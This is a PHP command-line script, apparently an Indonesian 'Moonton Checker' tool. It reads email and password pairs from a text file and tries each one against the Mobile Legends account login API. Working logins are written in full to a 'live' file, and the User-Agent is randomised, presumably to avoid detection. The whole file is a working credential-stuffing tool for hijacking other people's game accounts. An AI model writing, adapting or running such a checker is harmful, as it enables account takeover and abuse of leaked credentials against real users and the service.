<?php
##############################################
# Moonton Checker CLI BASED
# April 21th, Temanggung 56253 (@Catra) 
##############################################

function head(){
  echo "\033[32m
    _____ _  _ ______      _____  _____             
   / ____| || |____  |___ |  __ \|  __ \            
  | |    | || |_  / / __ \| |  | | |  | | _____   __
  | |    |__   _|/ / / _` | |  | | |  | |/ _ \ \ / /
  | |____   | | / / | (_| | |__| | |__| |  __/\ V / 
   \_____|  |_|/_/ \ \__,_|_____/|_____/ \___| \_/  
                    \____/                          \n";
  echo "\033[1;36m===============================================\n";
  echo "      \033[0;35mMoonton Checker [CLI Based]                 \n";
  echo "      Coded by @ctrndk (github.com/ctrndk)     \n";
  echo "\033[1;36m===============================================\033[0;37m\n";
}

function run() {
  echo "File (example.txt) : ";
  $file   = trim(fgets(STDIN));
  echo "Delim ( | or : or - )  : ";
  $delim  = trim(fgets(STDIN)); 
  echo "Log ? File \033[0;33m\"".$file."\"\033[0;37m Delim \033[0;33m\"".$delim."\"";
  echo "\n\033[1;36m===============================================\033[0;37m\n";
  $objek  = "file=".$file."&delim=".$delim;

  if(!empty($file) && !empty($delim)){
    $valid = cekData( $file, $delim );
    if($valid == "passed"){
      queue($file, $delim);
    }else{
      echo "\033[0;33mError : Kosong?\033[0;37m\n";
      exit();
    }
  }
  else
  {
    echo "\033[0;33mError: Sepertinya ada yang belum anda isi!\033[0;37m\n";
  }
  //return $objek;
}

function cekData( $file, $delim ) {
  $cek_file_type = explode(".", $file);
  if ( $cek_file_type[1] == "txt" ){
    if ( file_exists($file) )
    {
      switch ($delim) {
        case '|':
          $delim = "|";
          $valid = "passed";
          break;
        case '-';
          $delim = "|";
          $valid = "passed";
          break;
        case ':':
          $delim =":";
          $valid = "passed";
          break;
        default:
          echo "\033[0;33mError: Delimeter ?\033[0;37m\n";
          break;
      }
    }
    else
    {
      echo "\033[0;33mError : File tidak ditemukan!\033[0;37m\n";
    }
  }
  else 
  {
    echo "\033[0;33mError: File bukan .txt\033[0;37m\n";
  }
  if( !empty( $valid ) )
    {
      return $valid;
    }
  else
    {
      echo "\033[0;33mError: UNKNOWN\033[0;37m\n"; 
    }
}

function cekValid( $mail, $pass ){
  $md5pwd = md5($pass);
  $sign   = md5("account=".$mail."&md5pwd=".$md5pwd."&op=login");
  $data   = '{"op":"login","sign":"'.$sign.'","params":{"account":"'.$mail.'","md5pwd":"'.$md5pwd.'"},"lang":"en"}';
  $cl     = strlen($data);
  $h      = array();
  $h[] = "User-Agent: ".ua();
  $h[] = "Content-Lenght: $cl";
  $url = "https://accountmtapi.mobilelegends.com";
  $ch = curl_init();
  curl_setopt($ch, CURLOPT_URL, $url);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_HTTPHEADER, $h);
  curl_setopt($ch, CURLOPT_POST, 1);
  curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
  $output = curl_exec($ch);
  curl_close($ch);

  $response = json_decode($output, true);
  $res = $response['message'];
      $countall = 0;
      $countok  = 0;
      $countdie = 0;
      $countunk = 0;
      if ( $res == "Error_Success" ) {
          $countall +1;
          $countok +1;
          $change = $pass;
          $new = substr($change, 0, -3) . '***';
          $status = "\033[0;32m[+]LIVE - ".$mail."|".$new." [Terdaftar]\033[0;37m\n";
          $file   = "MontoonLive.txt";
          if($countok == 1){
          $results = fopen($file, "w");
          } 
          else {
          $results = fopen($file, "a"); 
          }
          $saved = "[LIVE] ".$mail."|".$pass." Checked at ./gunakan_dengan_bijak";
          fwrite($results, $saved."\n"); 
          fclose($results);
      }
      else if ( $res == "Error_PasswdError" ) {
          $countall +1;
          $countdie +1;
          $status = "\033[0;31m[x]DIE - ".$mail."|".$pass." [Password Salah]\033[0;37m\n";
          $file   = "MontoonDie.txt";
          if($countdie == 1){
          $results = fopen($file, "w");
          } 
          else {
          $results = fopen($file, "a"); 
          }
          $saved = "[DIE] ".$mail."|".$pass." Checked at ./MontoonCheckerLine";
          fwrite($results, $saved."\n"); 
          fclose($results);
      }
      else if ( $res == "Error_NoAccount" ) {
          $countall +1;
          $countdie +1;
          $status = "\033[0;31m[-]DIE - ".$mail."|".$pass." [Tidak terdaftar]\033[0;37m\n";
          $file   = "MontoonDie.txt";
          if($countdie == 1){
          $results = fopen($file, "w");
          } 
          else {
          $results = fopen($file, "a"); 
          }
          $saved = "[DIE] ".$mail."|".$pass." Checked at ./MontoonCheckerLine";
          fwrite($results, $saved."\n"); 
          fclose($results);
      }
      else {
          $countall +1;
          $countunk +1;
          $status = "\033[0;33m[?]UNKNOWN - ".$mail."|".$pass." [Unknown]\033[0;37m\n";
          $file   = "MontoonUnknown.txt";
          if($countunk == 1){
          $results = fopen($file, "w");
          } 
          else {
          $results = fopen($file, "a"); 
          }
          $saved = "[UNKNOWN] ".$mail."|".$pass." Checked at ./MontoonCheckerLine";
          fwrite($results, $saved."\n"); 
          fclose($results);
      }
$total = "\033[0;35mTOTAL [".$countall."] \033[0;37m| \033[0;32mLIVE [".$countok."] \033[0;37m| \033[0;31mDIE [".$countdie."] \033[0;37m| \033[0;33mUNKNOWN [".$countunk."]\033[0;37m\n";
return $status;
}

function ua(){
  $ran = "Mozilla/".rand(3,9).".".rand(0,9).". (Windows XP ".rand(10,50)."; WOW64; rv:47.0) Gecko/20100101 Firefox/".rand(47,99)."0";
  return $ran;
}

function queue( $f, $d="|") {
$data_list = file_get_contents($f);
$array_list = explode("\n",trim($data_list));
$i = 1;
foreach($array_list as $list){
  $pisah = explode($d, trim($list));
  if(!empty($pisah[0]) && !empty($pisah[1])){
    $u = $pisah[0];
    $p = $pisah[1];
  }
  else
  {
    echo "\033[0;33mError: Periksa kembali Delimeter atau isi file anda!\033[0;37m\n";
    exit();
  }
    date_default_timezone_set('Asia/Jakarta');
    echo "\033[0;36m[".date("H:i:s")."] ";
    echo cekValid($u,$p);
    //sleep(5);
    $i++;
}

}
head();
run();
?>